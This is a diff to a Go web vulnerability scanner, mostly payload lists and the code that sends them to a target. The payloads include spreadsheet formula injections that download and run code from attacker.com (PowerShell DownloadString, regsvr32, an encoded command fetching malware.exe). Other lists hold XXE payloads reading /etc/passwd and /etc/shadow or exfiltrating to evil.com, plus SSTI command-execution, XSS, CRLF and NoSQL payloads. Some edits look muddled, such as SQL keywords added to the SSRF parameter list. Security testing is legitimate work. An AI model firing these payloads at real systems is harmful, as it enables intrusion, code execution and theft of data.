@@ -38,18 +38,18 @@ type ScanResult struct {
 
 // VBA Macro payloads for testing
 var vbaPayloads = []string{
-	"=cmd|'/c calc'!A1",
-	"=cmd|'/c powershell -NoP -sta -NonI -W Hidden -Enc JGkAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAaQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAGMAbwBtAC8AbQBhAGwAdwBhAHIAZQAuAGUAeABlACcALAAnAEMAOgBcAFwAdABlAG0AcABcAFwAbQBhAGwAdwBhAHIAZQAuAGUAeABlACcAKQA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAnAEMAOgBcAFwAdABlAG0AcABcAFwAbQBhAGwAdwBhAHIAZQAuAGUAeABlACcA'!A1",
-	"=MSEXCEL|'\\..\\..\\Windows\\System32\\cmd.exe /c calc.exe'!A1",
-	"=MSEXCEL|'\\..\\..\\Windows\\System32\\regsvr32.exe /s /u /i:http://attacker.com/payload.sct scrobj.dll'!A1",
-	"=cmd|'/c powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://attacker.com/payload.ps1\\\")\"'!A1",
-	"=cmd|'/c rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://attacker.com/payload.sct\")\"'!A1",
-	"=IMPORTXML(CONCAT(\"http://attacker.com/?leak=\",CONCATENATE(A1:E1)),\"/results/result\")",
-	"=DDE(\"cmd\",\"/c calc\",\"A1\")",
-	"@SUM(1+9)*cmd|' /c calc'!A0",
-	"=HYPERLINK(\"http://attacker.com\", \"Click Here\")",
-	"+EXEC(\"cmd /c calc\")",
-	"=FORMULA(INDIRECT(\"return=shell(\"\"calc\"\")\"&CHAR(10)))",
+	`=cmd|'/c calc'!A1`,
+	`=cmd|'/c powershell -NoP -sta -NonI -W Hidden -Enc JGkAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAaQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAGMAbwBtAC8AbQBhAGwAdwBhAHIAZQAuAGUAeABlACcALAAnAEMAOgBcAFwAdABlAG0AcABcAFwAbQBhAGwAdwBhAHIAZQAuAGUAeABlACcAKQA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAnAEMAOgBcAFwAdABlAG0AcABcAFwAbQBhAGwAdwBhAHIAZQAuAGUAeABlACcA`,
+	`=MSEXCEL|'\\..\\..\\Windows\\System32\\cmd.exe /c calc.exe'!A1`,
+	`=MSEXCEL|'\\..\\..\\Windows\\System32\\regsvr32.exe /s /u /i:http://attacker.com/payload.sct scrobj.dll'!A1`,
+	`=cmd|'/c powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://attacker.com/payload.ps1\\\")\"'!A1`,
+	`=cmd|'/c rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://attacker.com/payload.sct\")\"'!A1`,
+	`=IMPORTXML(CONCAT(\"http://attacker.com/?leak=\",CONCATENATE(A1:E1)),\"/results/result\")`,
+	`=DDE(\"cmd\",\"/c calc\",\"A1\")`,
+	`@SUM(1+9)*cmd|' /c calc'!A0`,
+	`=HYPERLINK(\"http://attacker.com\", \"Click Here\")`,
+	`+EXEC(\"cmd /c calc\")`,
+	`=FORMULA(INDIRECT(\"return=shell(\"\"calc\"\")\"&CHAR(10)))`,
 }
 
 // SQL Injection payloads for testing
@@ -109,14 +109,17 @@ var openRedirectPayloads = []string{
 	"https:///evil.com/%2f..",
 	"https:////evil.com/%2f%2e%2e",
 	"https:////evil.com/%2f..",
-	"//evil.com\\@example.com",
-	"https://evil.com\\@example.com",
 	"//evil.com@example.com",
 	"https://evil.com@example.com",
 	"javascript:alert(1)",
 	"javascript://%0Aalert(1)",
 	"javascript://%0Aalert(1)//%0A",
 	"data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=",
+	"Response.Redirect(\"~/folder/Login.aspx\")",
+	"response.sendRedirect(\"http://www.mysite.com\")",
+	"https://:@google.com@example.com",
+	"<script>alert(1)</script>",
+	"<svg onload=alert(1)>",
 }
 
 // Server-Side Request Forgery (SSRF) payloads
@@ -161,6 +164,12 @@ var xxePayloads = []string{
 	"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://localhost:22\">]><foo>&xxe;</foo>",
 	"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
 	"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo>&xxe;</foo>",
+	"<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+	"<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><root>&xxe;</root>",
+	"<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]><root>&xxe;</root>",
+	"<!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://localhost:22\">]><root>&xxe;</root>",
+	"<!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>",
+	"<!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><root>&xxe;</root>",
 }
 
 // Server-Side Template Injection (SSTI) payloads
@@ -185,58 +194,6 @@ var sstiPayloads = []string{
 }
 
 // CRLF Injection payloads
-var crlfPayloads = []string{
-	"%0D%0A",
-	"%0D%0ASet-Cookie: sessionid=INJECT",
-	"%0D%0ASet-Cookie: sessionid=INJECT%0D%0A",
-	"%0D%0ALocation: https://evil.com%0D%0A",
-	"%0D%0AContent-Length: 0%0D%0A%0D%0AHTTP/1.1 200 OK%0D%0AContent-Type: text/html%0D%0AContent-Length: 35%0D%0A%0D%0A<script>alert('XSS')</script>",
-	"/%0D%0ASet-Cookie: sessionid=INJECT",
-	"/%0D%0ALocation: https://evil.com%0D%0A",
-	"%E5%98%8D%E5%98%8ASet-Cookie: sessionid=INJECT",
-	"%0DSet-Cookie: sessionid=INJECT",
-	"%0ASet-Cookie: sessionid=INJECT",
-	"%0D%0A%09Set-Cookie: sessionid=INJECT",
-}
-
-// Cross-Site Scripting (XSS) payloads
-var xssPayloads = []string{
-	"<script>alert(1)</script>",
-	"<img src=x onerror=alert(1)>",
-	"<svg onload=alert(1)>",
-	"javascript:alert(1)",
-	"<iframe src=javascript:alert(1)>",
-	"\'\"\><script>alert(1)</script>",
-	"\"'><img src=x onerror=alert(1)>",
-	"<body onload=alert(1)>",
-	"<a href=javascript:alert(1)>click me</a>",
-	"<input autofocus onfocus=alert(1)>",
-	"<marquee onstart=alert(1)>",
-	"<form action=javascript:alert(1)><input type=submit>",
-	"<isindex action=javascript:alert(1) type=submit value=click>",
-	"<style>@keyframes x{}</style><xss style=animation-name:x onanimationstart=alert(1)>",
-	"<link rel=stylesheet href=javascript:alert(1)>",
-	"<script src=data:text/javascript,alert(1)></script>",
-	"<iframe srcdoc=\"<script>alert(1)</script>\">",
-	"<meta http-equiv=refresh content=\"0;url=javascript:alert(1)\">",
-	"<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>",
-	"<script>eval(atob('YWxlcnQoMSk='))</script>",
-	"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
-	"<img src=1 onerror=alert(1) onload=alert(2)>",
-	"<svg><set attributeName=onload value=alert(1)>",
-	"<img src=x:alert(alt) onerror=eval(src) alt=1>",
-	"<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
-	"<svg><animate onend=alert(1) attributeName=x dur=1s>",
-	"<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2>",
-	"<svg><discard onbegin=alert(1)>",
-	"<svg><use href=\"#x\" onbegin=alert(1)>",
-	"<svg><g id=x>\"><set onbegin=alert(1)>",
-	"<svg><script>alert(1)<?svg>",
-	"<svg><script>alert(1)</script>",
-	"<svg><!--><script>alert(1)<!-->",
-}
-
-// CRLF Injection payloads for testing
 var crlfPayloads = []string{
 	"%0D%0A",
 	"%0A",
@@ -267,138 +224,44 @@ var crlfPayloads = []string{
 	"%0D%0A%0D%0A<script>alert(1)</script>",
 	"%0D%0A%0D%0A<img src=x onerror=alert(1)>",
 	"%0D%0A%0D%0A<svg onload=alert(1)>",
-	"%E5%98%8D%E5%98%8ASet-Cookie: crlf=injection", // UTF-8 encoded CRLF
-	"%E5%98%8D%E5%98%8ALocation: https://evil.com"  // UTF-8 encoded CRLF
+	"%0D%0ASet-Cookie: crlf=injection",
+	"%0ALocation: https://evil.com",
 }
 
-// Server-Side Template Injection (SSTI) payloads for testing
-var sstiPayloads = []string{
-	// Jinja2/Twig/Flask
-	"{{7*7}}",
-	"{{7*'7'}}",
-	"{{config}}",
-	"{{config.items()}}",
-	"{{request}}",
-	"{{request.environ}}",
-	"{{self}}",
-	"{{self.__dict__}}",
-	"{{url_for.__globals__}}",
-	"{{url_for.__globals__.os.popen('id').read()}}",
-	"{{''.__class__.__mro__[1].__subclasses__()}}",
-	"{{''.__class__.__mro__[2].__subclasses__()}}",
-	"{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}",
-	
-	// Freemarker
-	"<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
-	"${\"\"..getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")}",
-	
-	// Velocity
-	"#set($str=$class.inspect(\"java.lang.String\").type)#set($chr=$class.inspect(\"java.lang.Character\").type)#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
-	
-	// Smarty
-	"{php}echo `id`;{/php}",
-	"{php}system('id');{/php}",
-	"{php}passthru('id');{/php}",
-	"{php}eval('echo \"<pre>\"; system(\"id\"); echo \"</pre>\";');{/php}",
-	
-	// Handlebars - simplified version to avoid syntax errors
-	"{{#with \"s\" as |string|}}",
-	"{{lookup string \"constructor\"}}",
-	"{{string.constructor \"return process.env\"}}",
-	"{{/with}}",
-	
-	// Pug/Jade
-	"- var x = root.process",
-	"- x = x.mainModule.require",
-	"- x = x('child_process')",
-	"= x.execSync('id')",
-	
-	// ERB (Ruby)
-	"<%= 7 * 7 %>",
-	"<%= system('id') %>",
-	"<%= `id` %>",
-	"<%= IO.popen('id').readlines() %>",
-	"<%= require 'open3'; Open3.capture2('id') %>",
-	
-	// Django
-	"{% debug %}",
-	"{% load module %}",
-	"{% include request.GET.template_name %}",
-	"{% extends request.GET.template_name %}",
-	
-	// ASP.NET Razor
-	"@(7*7)",
-	"@{// C# code}",
-	"@System.Diagnostics.Process.Start(\"cmd.exe\",\"/c id\")",
-	
-	// Thymeleaf
-	"${7*7}",
-	"${T(java.lang.Runtime).getRuntime().exec('id')}",
-	"${T(java.lang.System).getenv()}",
-	
-	// Generic tests
-	"${7*7}",
-	"${{7*7}}",
-	"#{7*7}",
-	"#{{7*7}}",
-	"@(7*7)",
-	"${\"test\".constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"id\")}",
-	"<%= 7 * 7 %>",
-	"<#= 7 * 7 #>",
-	"<? 7 * 7 ?>",
-	"<% 7 * 7 %>",
-	"[[ 7 * 7 ]]",
-	"[%= 7 * 7 %]",
-	"[%= 7 * 7 %]",
-	"{{ \"string\".constructor.constructor(\"alert(1)\")() }}",
-	"{{ this.constructor.constructor(\"alert(1)\")() }}"
-}
-
-// XML External Entity (XXE) payloads for testing
-var xxePayloads = []string{
-	// Basic XXE payloads
-	"<?xml version=\"1.0\" ?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>",
-	"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
-	"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]><foo>&xxe;</foo>",
-	"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
-	
-	// XXE with protocol wrappers
-	"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
-	"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
-	"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"data://text/plain;base64,aGVsbG8gd29ybGQ=\">]><foo>&xxe;</foo>",
-	
-	// XXE with parameter entities
-	"<!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://evil.com/evil.dtd\">%dtd;]>",
-	"<!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?x=%file;'>\">%eval;%exfil;]>",
-	
-	// XXE for SSRF
-	"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://internal.service/\">]><foo>&xxe;</foo>",
-	"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://localhost:22/\">]><foo>&xxe;</foo>",
-	"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
-	
-	// XXE with DTD
-	"<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [ <!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> %xxe; ]><test></test>",
-	
-	// XXE with CDATA
-	"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % start \"<![CDATA[\"><!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % end \"]]>\"><!ENTITY % dtd SYSTEM \"http://evil.com/evil.dtd\">%dtd;]>",
-	
-	// XXE with external parameter entities
-	"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://evil.com/evil.dtd\">%remote;]>",
-	
-	// XXE with XML namespace
-	"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">%xxe;]><root xmlns=\"http://example.com/&xxe;"></root>",
-	
-	// XXE with SVG
-	"<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\" > ]><svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"><text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text></svg>",
-	
-	// XXE with XML bomb (billion laughs attack)
-	"<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\"><!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\"><!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\"><!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\"><!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\"><!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\"><!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">]><lolz>&lol9;</lolz>",
-	
-	// XXE with SOAP
-	"<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>",
-	
-	// XXE with DOCX/XLSX/PPTX
-	"<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+// Cross-Site Scripting (XSS) payloads
+var xssPayloads = []string{
+	"<script>alert(1)</script>",
+	"<img src=x onerror=alert(1)>",
+	"<svg onload=alert(1)>",
+	"javascript:alert(1)",
+	"<iframe src=javascript:alert(1)>",
+	"'\"\"><script>alert(1)</script>",
+	"\"'><img src=x onerror=alert(1)>",
+	"<body onload=alert(1)>",
+	"<a href=javascript:alert(1)>click me</a>",
+	"<input autofocus onfocus=alert(1)>",
+	"<marquee onstart=alert(1)>",
+	"<form action=javascript:alert(1)><input type=submit>",
+	"<isindex action=javascript:alert(1) type=submit value=click>",
+	"<style>@keyframes x{}</style><xss style=animation-name:x onanimationstart=alert(1)>",
+	"<link rel=stylesheet href=javascript:alert(1)>",
+	"<script src=data:text/javascript,alert(1)></script>",
+	"<iframe srcdoc=\"<script>alert(1)</script>\">",
+	"<meta http-equiv=refresh content=\"0;url=javascript:alert(1)\">",
+	"<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>",
+	"<script>eval(atob('YWxlcnQoMSk='))</script>",
+	"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
+	"<img src=1 onerror=alert(1) onload=alert(2)>",
+	"<svg><set attributeName=onload value=alert(1)>",
+	"<img src=x:alert(alt) onerror=eval(src) alt=1>",
+	"<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+	"<svg><animate onend=alert(1) attributeName=x dur=1s>",
+	"<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2>",
+	"<svg><discard onbegin=alert(1)>",
+	"<svg><use href=\"#x\" onbegin=alert(1)>",
+	"<svg><g id=x>\"><set onbegin=alert(1)>",
+	"<svg><script>alert(1)</script>",
+	"<svg><!--><script>alert(1)</script>",
 }
 
 // VBA macro injection patterns to detect
@@ -510,7 +373,71 @@ var (
 	scanSQLi      bool = true
 )
 
-// ... (rest of the code remains the same)
+// Account Takeover (ATO) test payloads & scenarios
+var atoPayloads = []string{
+	// Common weak reset tokens
+	"000000",
+	"123456",
+	"abcdef",
+	// Email change attempts
+	"{'email': 'attacker@example.com'}",
+	// Session fixation
+	"PHPSESSID=attacker",
+	"JSESSIONID=attacker",
+	// Password reset links with predictable tokens
+	"/reset?token=123456",
+	"/reset?token=abcdef",
+	// Username enumeration
+	"{'username': 'admin'}",
+}
+
+// Business Logic Error test payloads & scenarios
+var businessLogicPayloads = []string{
+	// Negative quantity/price
+	"quantity=-1",
+	"price=-100",
+	// Bypass limits
+	"amount=1000000",
+	// Unauthorized role escalation
+	"role=admin",
+	// Multiple purchases with single-use coupon
+	"coupon=FREE100",
+	// Repeated transaction attempts
+	"repeat=10",
+}
+
+// NoSQL Injection payloads
+var nosqlPayloads = []string{
+	// MongoDB
+	"{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
+	"{\"username\":{\"$gt\":\"\"}}",
+	"{\"$or\":[{},{}]}",
+	"{\"$where\":\"1==1\"}",
+	// CouchDB
+	"_id[$ne]=1",
+	// Array injection
+	"username[]=admin&password[]=admin",
+	// Boolean-based
+	"username=admin' || '1'=='1",
+}
+
+// GraphQL Injection payloads
+var graphqlPayloads = []string{
+	// Introspection
+	"{ __schema { types { name fields { name } } } }",
+	// Query injection
+	"{ user(id: 1) { id username password } }",
+	// Field injection
+	"{ allUsers { id username email password } }",
+	// Malformed query
+	"{ __typename }",
+	// Aliased query
+	"query x { y: allUsers { id } }",
+	// Batch query
+	"{ a: user(id:1){id}, b: user(id:2){id} }",
+	// Injection attempt
+	"{ user(id: \"1 OR 1=1\") { id username } }",
+}
 
 func main() {
 	// Parse command line flags
@@ -582,10 +509,10 @@ func printBanner() {
 	// Print ASCII art logo
 	fmt.Printf("%s", blue)
 	fmt.Println("    _       _   _              __  __ _____ _____ ")
-	fmt.Println("   / \   ___| |_| |__   ___ _ _\ \/ // ____/ ____|")  
-	fmt.Println("  / _ \ / _ \ __| '_ \ / _ \ '__\  /| (___| (___  ")
-	fmt.Println(" / ___ \  __/ |_| | | |  __/ |  /  \ \___ \\___ \ ")
-	fmt.Println("/_/   \_\___|\__|_| |_|\___|_| /_/\_\____/|____/ ")
+	fmt.Println("   / \\   ___| |_| |__   ___ _ _\\ \\/ // ____/ ____|")  
+	fmt.Println("  / _ \\ / _ \\ __| '_ \\ / _ \\ '__\\  /| (___| (___  ")
+	fmt.Println(" / ___ \\  __/ |_| | | |  __/ |  /  \\ \\___ \\___ \\ ")
+	fmt.Println("/_/   \\_\\___|\\__|_| |_|\\___|_| /_/\\_\\____/|____/ ")
 	fmt.Printf("%s", reset)
 	
 	// Print version and description
@@ -683,7 +610,9 @@ func startScan() {
 	fmt.Println("[*] Testing for Server-Side Request Forgery (SSRF) vulnerabilities...")
 	
 	// Parameters that are commonly vulnerable to SSRF
-	ssrfParams := []string{"url", "uri", "api", "endpoint", "src", "source", "data", "path", "load", "page", "file", "dir", "domain", "site", "callback", "feed", "host", "port", "to", "from"}
+	ssrfParams := []string{"url", "uri", "api", "endpoint", "src", "source", "data", "path", "load", "page", "file", "dir", "domain", "site", "target",
+		"view", "table", "db", "database", "select", "update", "insert", "delete", "where", "value",
+	}
 	
 	// Test each parameter with each payload
 	for _, param := range ssrfParams {
@@ -801,6 +730,90 @@ func startScan() {
 			}(param, payload)
 		}
 	}
+	
+	// Test for Account Takeover (ATO) vulnerabilities
+	fmt.Println("[*] Testing for Account Takeover (ATO) vulnerabilities...")
+	
+	// Parameters that are commonly vulnerable to ATO
+	atoParams := []string{"email", "username", "password", "reset", "recover", "login", "auth"}
+	
+	// Test each parameter with each payload
+	for _, param := range atoParams {
+		for _, payload := range atoPayloads {
+			wg.Add(1)
+			semaphore <- struct{}{} // Acquire semaphore
+			
+			go func(p string, pl string) {
+				defer wg.Done()
+				defer func() { <-semaphore }() // Release semaphore
+				
+				testATO(p, pl)
+			}(param, payload)
+		}
+	}
+	
+	// Test for Business Logic Error vulnerabilities
+	fmt.Println("[*] Testing for Business Logic Error vulnerabilities...")
+	
+	// Parameters that are commonly vulnerable to Business Logic Errors
+	businessLogicParams := []string{"quantity", "price", "amount", "role", "coupon", "repeat"}
+	
+	// Test each parameter with each payload
+	for _, param := range businessLogicParams {
+		for _, payload := range businessLogicPayloads {
+			wg.Add(1)
+			semaphore <- struct{}{} // Acquire semaphore
+			
+			go func(p string, pl string) {
+				defer wg.Done()
+				defer func() { <-semaphore }() // Release semaphore
+				
+				testBusinessLogic(p, pl)
+			}(param, payload)
+		}
+	}
+	
+	// Test for NoSQL Injection vulnerabilities
+	fmt.Println("[*] Testing for NoSQL Injection vulnerabilities...")
+	
+	// Parameters that are commonly vulnerable to NoSQL Injection
+	nosqlParams := []string{"username", "password", "id", "user_id", "userid", "login", "name", "search", "query", "q"}
+	
+	// Test each parameter with each payload
+	for _, param := range nosqlParams {
+		for _, payload := range nosqlPayloads {
+			wg.Add(1)
+			semaphore <- struct{}{} // Acquire semaphore
+			
+			go func(p string, pl string) {
+				defer wg.Done()
+				defer func() { <-semaphore }() // Release semaphore
+				
+				testNoSQLInjection(p, pl)
+			}(param, payload)
+		}
+	}
+	
+	// Test for GraphQL Injection vulnerabilities
+	fmt.Println("[*] Testing for GraphQL Injection vulnerabilities...")
+	
+	// Parameters that are commonly vulnerable to GraphQL Injection
+	graphqlParams := []string{"query", "mutation", "subscription", "id", "user_id", "userid", "login", "name", "search", "q"}
+	
+	// Test each parameter with each payload
+	for _, param := range graphqlParams {
+		for _, payload := range graphqlPayloads {
+			wg.Add(1)
+			semaphore <- struct{}{} // Acquire semaphore
+			
+			go func(p string, pl string) {
+				defer wg.Done()
+				defer func() { <-semaphore }() // Release semaphore
+				
+				testGraphQLInjection(p, pl)
+			}(param, payload)
+		}
+	}
 }
 
 func testVBAInjection(param, payload string) {
@@ -837,7 +850,7 @@ func testVBAInjection(param, payload string) {
 			// Vulnerability found
 			mutex.Lock()
 			vuln := VBAVulnerability{
-				Type:       VBAMacroInjection,
+				Type:       "VBA Macro Injection",
 				URL:        testURL,
 				Parameter:  param,
 				Evidence:   fmt.Sprintf("Found pattern: %s", pattern),
@@ -911,6 +924,7 @@ func sendRequest(method, url, body string) (*http.Response, error) {
 	
 	// Send request
 	return client.Do(req)
+}
 
 func printSummary(startTime time.Time) {
 	// ANSI color codes
@@ -1471,17 +1485,6 @@ func testXSS(param, payload string) {
 			confidence = "High"
 		}
 		
-		// Check if the payload is in an attribute context
-		if (strings.Contains(bodyStr, "="+payload) || 
-		    strings.Contains(bodyStr, "='"+payload) || 
-		    strings.Contains(bodyStr, "="+payload+"'") || 
-		    strings.Contains(bodyStr, "=\""+payload) || 
-		    strings.Contains(bodyStr, "="+payload+"\"")) {
-			xssType = "Reflected XSS (Attribute Context)"
-			severity = "High"
-			confidence = "Medium"
-		}
-		
 		// Check for WAF bypass indicators
 		if strings.Contains(payload, "javascript:") || 
 		   strings.Contains(payload, "data:") || 
@@ -1546,6 +1549,10 @@ func testCRLF(param, payload string) {
 	
 	// Create a custom HTTP client that doesn't follow redirects
 	client := &http.Client{
+		Timeout:   time.Duration(timeout) * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
 		CheckRedirect: func(req *http.Request, via []*http.Request) error {
 			return http.ErrUseLastResponse
 		},
@@ -1996,7 +2003,6 @@ func testXXE(param, payload string) {
 	if (strings.Contains(bodyStr, "root:") && strings.Contains(bodyStr, "/bin/bash")) || 
 	   strings.Contains(bodyStr, "daemon:") || 
 	   strings.Contains(bodyStr, "nobody:") || 
-	   strings.Contains(bodyStr, "mail:") || 
 	   strings.Contains(bodyStr, "/etc/passwd") || 
 	   strings.Contains(bodyStr, "/etc/shadow") || 
 	   strings.Contains(bodyStr, "[boot loader]") || 
